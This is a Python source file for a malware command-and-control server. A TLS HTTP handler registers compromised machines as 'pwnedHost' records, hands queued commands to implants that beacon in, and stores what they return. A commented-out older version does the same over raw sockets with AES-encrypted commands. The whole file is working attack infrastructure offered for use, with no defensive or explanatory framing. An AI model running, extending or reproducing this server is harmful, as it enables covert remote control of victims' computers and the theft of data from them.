from http.server import *
import random
import string
import ssl
from command_control.models import pwnedHost


chars = string.ascii_letters + string.digits
session_value = ''.join(random.choice(chars) for i in range(20))


class Server_Response(BaseHTTPRequestHandler):


    def set_attributes(self):
        global ip
        global host
        ip = self.client_address[0]
        if pwnedHost.objects.filter(ip=ip):
            host = pwnedHost.objects.get(ip=ip)
        else:
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = post_data.decode('utf-8')
            except:
                pass
            host = pwnedHost(author=author, ip=ip, username=data)
            host.save()


    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie',session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    # Allow GET
    def do_GET(self):
        self.set_attributes()
        self.set_headers()
        message = host.cmd[6:]
        print(host.cmd)
        if message:
            self.wfile.write(bytes(message, 'utf8'))
            host.cmd = ""
            host.save()

    # Allow POST
    def do_POST(self):
        self.set_attributes()
        self.set_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = post_data.decode('utf-8')
        if data:
            host.result = data
            host.save()


def run(auth_user, ip , port, enc_key):
    global author
    global secret
    global cipher
    secret = enc_key
    author = auth_user
    global Server_Response
    print("Server Started ..!!")
    server_address = (ip, port)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server.cert', keyfile='server.key', server_side=True)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.cert', keyfile="server.key", server_side=True)
    print('running server...')
    httpd.serve_forever()


"""

from Crypto.Cipher import AES
import time
from command_control.models import pwnedHost
import socket
import base64
import os
import threading
from multiprocessing import Process


lock = threading.Lock()
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
iv = os.urandom(16)


def create_socket(user, interface, port, encryption_key):
    try:
        global s
        global sock
        global author
        global secret
        global cipher
        secret = encryption_key
        cipher = AES.new(secret, AES.MODE_CFB, iv)
        interface = interface
        port = port
        author = user
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket(author, interface, port)


def thread_sock_connect():
    t = threading.Thread(target=sock_connect())
    t.start()


def sock_connect():
    global connect
    global ip_addr
    try:
        print(threading.current_thread().name)
        connect, ip_addr = s.accept()
        print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
        print("\n")
        user = connect.recv(1024)
        host = pwnedHost(author= author, ip=ip_addr[0], port=ip_addr[1], username= user)
        host.save()
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))


def command_control(command, id, ip_address):
    host = pwnedHost.objects.get(id=id, ip=ip_address)
    try:
        encrypted = EncodeAES(cipher, command)
        connect.sendto(encrypted,(host.ip,host.port))
        result = connect.recv(16384)
        return DecodeAES(cipher,result)
    except:
        host.delete()

"""


